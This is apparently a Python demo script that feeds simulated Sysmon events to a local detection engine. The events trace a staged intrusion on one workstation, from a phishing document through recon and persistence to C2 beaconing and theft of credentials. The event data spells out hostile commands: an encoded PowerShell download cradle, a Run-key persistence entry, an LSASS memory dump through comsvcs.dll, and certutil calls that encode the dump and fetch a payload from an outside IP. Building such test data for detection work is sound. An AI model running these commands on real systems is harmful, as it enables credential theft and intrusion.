#!/usr/bin/env python3
"""Seed one deep, multi-stage intrusion for demos and screenshots.

Unlike seed_demo.py (which spreads varied activity across several hosts to fill
every panel), this builds a single rich incident on one host: a full intrusion
kill chain with a deep, branching process tree, so the correlator, the process
chain, the timeline and the forensic detail all have something substantial to
show.

The story, on WKSTN-FINANCE-04:

    explorer.exe
      └─ OUTLOOK.EXE              user opens a phishing attachment
          └─ WINWORD.EXE          the malicious document
              └─ cmd.exe          macro drops to a shell
                  ├─ powershell.exe (cradle)      downloads stage 2
                  │   ├─ whoami / net / nltest / systeminfo   recon burst
                  │   ├─ rundll32.exe              injected C2, beacons out
                  │   └─ reg.exe                   Run-key persistence
                  └─ powershell.exe (lsass)        credential theft
                      └─ certutil.exe              exfil staging

    python scripts/seed_apt.py
"""

from __future__ import annotations

import argparse
import random
import sys
import time
from datetime import datetime, timedelta, timezone

import httpx

HOST = "WKSTN-FINANCE-04"
USER = "CORP\\a.morales"
BASE = datetime.now(timezone.utc) - timedelta(minutes=12)


def at(offset: float) -> str:
    return (BASE + timedelta(seconds=offset)).isoformat()


def proc(offset, guid, parent_guid, image, cmdline, **extra):
    """A process-creation event (EventID 1) with full forensic fields."""
    data = {
        "Image": image,
        "ProcessGuid": guid,
        "ParentProcessGuid": parent_guid,
        "CommandLine": cmdline,
        "User": USER,
        "UtcTime": at(offset),
        "IntegrityLevel": extra.pop("integrity", "Medium"),
        "ProcessId": str(extra.pop("pid", random.randint(2000, 9000))),
        "ParentProcessId": str(extra.pop("ppid", random.randint(2000, 9000))),
        "LogonId": "0x3a91f2",
        "TerminalSessionId": "2",
        "CurrentDirectory": extra.pop("cwd", r"C:\Users\a.morales\Downloads"),
    }
    if "hashes" in extra:
        data["Hashes"] = extra.pop("hashes")
    if "parent_cmdline" in extra:
        data["ParentCommandLine"] = extra.pop("parent_cmdline")
    data.update(extra)
    return {
        "winlog": {"event_id": 1, "computer_name": HOST, "event_data": data},
        "@timestamp": at(offset),
    }


def raw_event(eid, offset, **data):
    data["UtcTime"] = at(offset)
    return {
        "winlog": {"event_id": eid, "computer_name": HOST, "event_data": data},
        "@timestamp": at(offset),
    }


# GUIDs for the tree
G = {
    "explorer": "{apt-explorer}",
    "outlook": "{apt-outlook}",
    "word": "{apt-word}",
    "cmd": "{apt-cmd}",
    "ps_cradle": "{apt-ps-cradle}",
    "ps_lsass": "{apt-ps-lsass}",
    "rundll": "{apt-rundll}",
    "reg": "{apt-reg}",
    "certutil": "{apt-certutil}",
    "whoami": "{apt-whoami}",
    "net": "{apt-net}",
    "nltest": "{apt-nltest}",
    "systeminfo": "{apt-systeminfo}",
}


def events() -> list[dict]:
    ev: list[dict] = []

    # --- Foothold: explorer -> Outlook -> Word (benign, builds the tree top) ---
    ev.append(
        proc(
            0,
            G["explorer"],
            "{apt-boot}",
            r"C:\Windows\explorer.exe",
            "explorer.exe",
            pid=4120,
            ppid=880,
            integrity="Medium",
        )
    )
    ev.append(
        proc(
            3,
            G["outlook"],
            G["explorer"],
            r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
            '"OUTLOOK.EXE"',
            pid=5312,
            ppid=4120,
        )
    )
    ev.append(
        proc(
            11,
            G["word"],
            G["outlook"],
            r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            r'"WINWORD.EXE" /n "C:\Users\a.morales\Downloads\Remittance_Advice.docm"',
            pid=6044,
            ppid=5312,
            hashes="SHA256=9f2b4a1c8e7d3f6a0b5c9e2d1f4a7b8c,MD5=a1b2c3d4e5f6a7b8",
        )
    )

    # --- Macro executes: Word -> cmd -> powershell cradle (SYS-001, SYS-005, SYS-009) ---
    ev.append(
        proc(
            14,
            G["cmd"],
            G["word"],
            r"C:\Windows\System32\cmd.exe",
            r"cmd.exe /c powershell -w hidden -nop -enc "
            r"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA",
            pid=6820,
            ppid=6044,
            parent_cmdline=r'"WINWORD.EXE" /n "Remittance_Advice.docm"',
        )
    )
    ev.append(
        proc(
            16,
            G["ps_cradle"],
            G["cmd"],
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            r"powershell -w hidden -nop -enc "
            r"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8A",
            pid=7010,
            ppid=6820,
            hashes="SHA256=b7c9d2e4f6a8c0b1d3e5f7a9c1b3d5e7",
        )
    )

    # --- Recon burst under the cradle (DSC-001: 4 distinct techniques) ---
    ev.append(
        proc(
            24,
            G["whoami"],
            G["ps_cradle"],
            r"C:\Windows\System32\whoami.exe",
            "whoami /all",
            pid=7120,
            ppid=7010,
        )
    )
    ev.append(
        proc(
            29,
            G["net"],
            G["ps_cradle"],
            r"C:\Windows\System32\net.exe",
            'net group "Domain Admins" /domain',
            pid=7180,
            ppid=7010,
        )
    )
    ev.append(
        proc(
            34,
            G["nltest"],
            G["ps_cradle"],
            r"C:\Windows\System32\nltest.exe",
            "nltest /dclist:corp.local",
            pid=7240,
            ppid=7010,
        )
    )
    ev.append(
        proc(
            40,
            G["systeminfo"],
            G["ps_cradle"],
            r"C:\Windows\System32\systeminfo.exe",
            "systeminfo",
            pid=7300,
            ppid=7010,
        )
    )

    # --- Persistence: Run key (SYS-030) ---
    ev.append(
        proc(
            52,
            G["reg"],
            G["ps_cradle"],
            r"C:\Windows\System32\reg.exe",
            r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run "
            r"/v OneDriveSync /t REG_SZ /d C:\Users\a.morales\AppData\Roaming\sync.exe /f",
            pid=7360,
            ppid=7010,
        )
    )
    ev.append(
        raw_event(
            13,
            53,
            Image=r"C:\Windows\System32\reg.exe",
            ProcessGuid=G["reg"],
            TargetObject=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync",
            Details=r"C:\Users\a.morales\AppData\Roaming\sync.exe",
        )
    )

    # --- Injected C2 via rundll32, beacons out (SYS-008 + BCN-001) ---
    ev.append(
        proc(
            60,
            G["rundll"],
            G["ps_cradle"],
            r"C:\Windows\System32\rundll32.exe",
            "rundll32.exe",
            pid=7420,
            ppid=7010,
            integrity="Medium",
        )
    )
    # named pipe (SYS-060)
    ev.append(
        raw_event(
            17,
            61,
            Image=r"C:\Windows\System32\rundll32.exe",
            ProcessGuid=G["rundll"],
            PipeName=r"\msagent_7e",
        )
    )
    # beacon: ~40s callbacks with jitter
    random.seed(4242)
    clock = 64.0
    for _ in range(11):
        ev.append(
            raw_event(
                3,
                clock,
                Image=r"C:\Windows\System32\rundll32.exe",
                ProcessGuid=G["rundll"],
                DestinationIp="45.132.192.68",
                DestinationPort="443",
                DestinationHostname="cdn-edge-7.telemetry-sync.net",
            )
        )
        clock += 40 * (1 - random.uniform(0, 0.35))

    # --- Credential theft: second powershell -> LSASS (SYS-041, critical) ---
    ev.append(
        proc(
            72,
            G["ps_lsass"],
            G["cmd"],
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            r"powershell -w hidden -c "
            r"rundll32 comsvcs.dll MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full",
            pid=7600,
            ppid=6820,
            integrity="High",
        )
    )
    ev.append(
        raw_event(
            10,
            74,
            SourceImage=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            SourceProcessGuid=G["ps_lsass"],
            ProcessGuid=G["ps_lsass"],
            ParentProcessGuid=G["cmd"],
            TargetImage=r"C:\Windows\System32\lsass.exe",
            GrantedAccess="0x1410",
            User=USER,
        )
    )

    # --- Exfil staging: certutil encodes the dump (SYS-003) ---
    ev.append(
        proc(
            88,
            G["certutil"],
            G["ps_lsass"],
            r"C:\Windows\System32\certutil.exe",
            r"certutil -encode C:\temp\lsass.dmp C:\temp\cache.txt",
            pid=7720,
            ppid=7600,
            integrity="High",
        )
    )
    ev.append(
        proc(
            92,
            "{apt-certutil2}",
            G["ps_lsass"],
            r"C:\Windows\System32\certutil.exe",
            r"certutil -urlcache -split -f http://45.132.192.68/beacon.dat C:\temp\b.dat",
            pid=7740,
            ppid=7600,
            integrity="High",
        )
    )

    return ev


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Seed a complex multi-stage intrusion."
    )
    parser.add_argument("--url", default="http://localhost:8000/ingest")
    parser.add_argument("--delay", type=float, default=0.12)
    args = parser.parse_args()

    all_events = events()
    print(f"Seeding intrusion on {HOST}: {len(all_events)} events\n")

    fired: dict[str, int] = {}
    try:
        with httpx.Client(timeout=10.0) as client:
            for i, evt in enumerate(all_events, 1):
                try:
                    result = client.post(args.url, json=evt).json()
                except httpx.HTTPError as exc:
                    print(f"  ! event {i}: {exc}", file=sys.stderr)
                    continue
                for d in result.get("detections", []):
                    fired[d["rule_id"]] = fired.get(d["rule_id"], 0) + 1
                    print(
                        f"  [{d['severity'].upper():8}] {d['rule_id']:8} {d['title']}"
                    )
                if args.delay:
                    time.sleep(args.delay)
    except httpx.ConnectError:
        sys.exit(f"\nCannot reach {args.url}. Is the engine running?")

    print("\nRules fired:")
    for rule_id, count in sorted(fired.items()):
        print(f"  {rule_id:10} x{count}")
    print(f"\nOpen http://localhost:8000 and expand the {HOST} incident.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
